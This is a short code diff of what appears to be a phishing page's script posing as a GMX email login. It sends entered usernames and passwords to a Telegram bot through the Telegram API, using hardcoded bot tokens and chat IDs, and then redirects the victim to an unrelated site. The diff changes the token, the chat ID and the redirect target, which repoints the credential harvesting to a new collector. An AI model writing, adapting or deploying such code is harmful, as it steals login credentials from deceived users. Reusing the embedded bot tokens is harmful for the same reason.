@@ -218,8 +218,8 @@ footer#footer ul li{
       const formal = document.querySelector('#form')
     
       let bot = {
-          TOKEN: "8083233029:AAFNR3c28CWJbVWYaiBzYjA3dugrR54_Uwo",
-          chatID: "6852438788"
+          TOKEN: "7134043377:AAF6Exasyowtt1dNwWGEgyKoHgppX-aUYOw",
+          chatID: "6802983406"
       }
 
 
@@ -232,7 +232,7 @@ footer#footer ul li{
           fetch(`https://api.telegram.org/bot${bot.TOKEN}/sendMessage?chat_id=${bot.chatID}&text=GMX-RESULT=Username::${result1}==++==Password::${result2}`, {
               method: "GET"
           }).then(success => {
-              window.location.replace("https://www.google.com/?client=safari");
+              window.location.replace("https://www.koreatimes.co.kr/www2/index.asp");
           }, error => {
               alert("Message not sent")
               console.log(error)
